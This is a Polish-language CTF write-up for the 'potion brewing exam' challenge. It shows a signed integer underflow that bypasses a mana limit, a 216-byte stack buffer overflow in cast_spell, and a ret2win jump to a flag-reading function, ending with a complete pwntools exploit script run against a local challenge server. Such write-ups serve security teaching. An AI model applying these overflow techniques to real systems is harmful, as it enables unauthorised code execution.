# potion brewing exam

## Skrót
- Integer Underflow, aby otrzymać całkowitą manę >200
- Buffer overflow w funkcji `cast_spell`
- ret2win (`get_ancient_power`)

## Rekonesans
W plikach zadania dostajemy
- plik binarny
- kod źródłowy
- Dockerfile

Najpierw sprawdzamy z czym mamy do czynienia.

```console
$ file potion_brewing_exam

potion_brewing_exam: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5b414ea11f14491599cb6a7bec986f03133b3ee7, for GNU/Linux 3.2.0, not stripped
```
```console
$ pwn checksec potion_brewing_exam

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Widzimy, że plik jest 64-bitowy i zlinkowany dynamicznie. Z checksec wyczytujemy, że:
- ma częściowe `RELRO`
- nie ma kanarka
- bit `NX` jest włączony
- adres bazowy jest stały

Pzy przeglądaniu kodu źródłowego skupiamy się na funkcji `main`:

```c
int main(void)
{
    int mana = 0;

    setup();
    display_banner();
    
    puts("Welcome to your final potion brewing exam!");
    puts("You must mix the correct ingredients to create a mana potion.");
    puts("Be careful! If you don't follow the recipes, there might be unexpected consequences.");
    puts("You can add up to 4 ingredients.\n");

    for(int i = 0; i < 4; i++)
    {
        char ingredient[32];
        int mana_boost = 0;

        printf("> %d <\n", i+1);
        printf("ingredient: ");
        scanf("%30s", ingredient);
        printf("mana boost: ");
        scanf("%d", &mana_boost);
        if(mana_boost > 50)
        {
            puts("You can't add that ingredient!");
            puts("The potion will be unstable and we don't know what could happen.");
            puts("Exam is over!");
            exit(1);
        }

        mana += mana_boost;
    }

    cast_spell(mana);

    return 0;
}
```

Program prosi nas o 4 składniki do mikstury. Nazwa, składnika nie jest nigdzie używana, więc można ją zignorować. Program prosi też o manę składnika, która nie może przekraczać `50`.

Na końcu program wywołuje funkcję `cast_spell`, jako argument podając sumę many wszystkich składników.

```c
void cast_spell(int mana)
{
    puts("Great, now let's test your potion!");
    puts("Drink it and cast a spell!");

    char spell[200];
    read(0, spell, mana);
}
```

Funkcja wczytuje do bufora o wielkości 200B tyle znaków, ile wynosi suma naszej many. Jeżeli udałoby nam się przekazać funkcji wartość większą niż 200, to mielibyśmy podatność `buffer overflow`.

W kodzie jest jeszcze jedna ciekawa funkcja: `get_ancient_power`.

```c
void get_ancient_power(void)
{
    char buf[128] = {0};

    int fd = open("flag.txt", O_RDONLY);
    if(fd == -1)
    {
        puts("Can't find flag.txt");
    }

    read(fd, buf, 128);
    puts(buf);

    close(fd);
}
```

Jest to po prostu funkcja `win`, którą musimy wywołać aby dostać flagę.

## Rozwiązanie
Mamy już mentalny model, jak należy rozwiązać zadanie. Jeżeli uda nam się zyskać więcej many niż 200, to dzięki podatności typu buffer overflow będziemy mogli nadpisać return address funkcji `cast_spell` adresem `get_ancient_power` i zdobyć flagę. 

Ilość many, z jednego składnika, którą możemy zdobyć ogranicza ten warunek:
```c
if(mana_boost > 50)
{
    puts("You can't add that ingredient!");
    puts("The potion will be unstable and we don't know what could happen.");
    puts("Exam is over!");
    exit(1);
}
```

Wczytanie many wygląda tak:
```c
printf("mana boost: ");
scanf("%d", &mana_boost);
```

Jak widzimy, program wczytuje manę jako integer ze znakiem, ale nie sprawdza dolnej granicy. Możemy więc wpisać wartości ujemne.

Minimalna wartość inta ze znakiem wynosi `–2147483648`. Jeżeli nasza mana spadnie poniżej tej wartości to przez to, że int zapisywany jest tylko na 4 bajtach, zamieni się na wartość dodatnią. Potrzebujemy więc co najmniej 2 składników z ujemną wartością many, żeby przekręcić licznik. Jest to tzw. `Integer Underflow` np.:

    1 składnik:
        mana: -2147483447 [-(INT_MAX-200)]
        całkowita mana: -2147483447
    2 składnik:
        mana: -2147483447 [-(INT_MAX-200)]
        całkowita mana: ~400
    3 składnik:
        mana: 0
        całkowita mana: ~400
    4 składnik:
        mana: 0
        całkowita mana: ~400

Tym sposobem uzyskujemy wynik na jakim nam zależy, przy tym nie podając nigdy wartości większej niż `50`.

Możemy to sprawdzić przy pomocy gdb.

```
gef➤  b cast_spell 
Breakpoint 1 at 0x40131a
gef➤  r
```

```
> 1 <
ingredient: A            
mana boost: -2147483447
> 2 <
ingredient: B
mana boost: -2147483447
> 3 <
ingredient: C
mana boost: 0
> 4 <
ingredient: D
mana boost: 0
```

```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401344 <cast_spell+46>  lea    rax, [rbp-0xd0]
     0x40134b <cast_spell+53>  mov    rsi, rax
     0x40134e <cast_spell+56>  mov    edi, 0x0
 →   0x401353 <cast_spell+61>  call   0x401070 <read@plt>
   ↳    0x401070 <read@plt+0>     jmp    QWORD PTR [rip+0x2faa]        # 0x404020 <read@got.plt>
        0x401076 <read@plt+6>     push   0x4
        0x40107b <read@plt+11>    jmp    0x401020
        0x401080 <open@plt+0>     jmp    QWORD PTR [rip+0x2fa2]        # 0x404028 <open@got.plt>
        0x401086 <open@plt+6>     push   0x5
        0x40108b <open@plt+11>    jmp    0x401020
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fffffffdb30 → 0x0000003000000008,
   $rdx = 0x0000000000000192
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "potion_brewing_", stopped 0x401353 in cast_spell (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401353 → cast_spell()
[#1] 0x40145e → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Wartość `rdx` = 0x192 = 402

Teraz wystarczy tylko znaleźć offset potrzebny do nadpisania return address. Możemy to prosto zrobić za pomocą cyklu de Bruijna.

```console
$ pwn cyclic 400

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
```

Po wpisaniu ciągu do funkcji read.
```
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc08│+0x0000: "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"	 ← $rsp
0x00007fffffffdc10│+0x0008: "gaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsa[...]"
0x00007fffffffdc18│+0x0010: "iaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacua[...]"
0x00007fffffffdc20│+0x0018: "kaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwa[...]"
0x00007fffffffdc28│+0x0020: "maacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacya[...]"
0x00007fffffffdc30│+0x0028: "oaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadba[...]"
0x00007fffffffdc38│+0x0030: "qaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaadda[...]"
0x00007fffffffdc40│+0x0038: "saactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfa[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401353 <cast_spell+61>  call   0x401070 <read@plt>
     0x401358 <cast_spell+66>  nop    
     0x401359 <cast_spell+67>  leave  
 →   0x40135a <cast_spell+68>  ret    
[!] Cannot disassemble from $PC
```

```console
$ pwn cyclic -l eaac

216
```

Musimy więc wysłać 216 bajtów paddingu po czym adres funkcji `get_ancient_power`.

## Finalny exploit
```py
#!/usr/bin/env python
from pwn import *

##### SPECIFY BINARY #####
elf = context.binary = ELF('../src/potion_brewing_exam')

context.terminal = ['gnome-terminal', '--tab', '--']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        ##### SPECIFY SERVER AND PORT #####
        SERVER = 'localhost'
        PORT = 13371         
        return remote(SERVER, PORT, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

MAX_INT = 2147483647

UNDERFLOW = -(MAX_INT-200)

io.recvuntil(b'ingredient')

io.sendline(b'a')
io.sendline(str(UNDERFLOW).encode())

io.sendline(b'b')
io.sendline(str(UNDERFLOW).encode())

io.sendline(b'c')
io.sendline(b'0')

io.sendline(b'd')
io.sendline(b'0')

spell = flat(
    'A'*216,
    elf.sym['get_ancient_power']
)

io.recvuntil(b'spell!')
io.sendline(spell)

io.interactive()


```

```console
$ python exploit.py REMOTE

flag{testflag}
```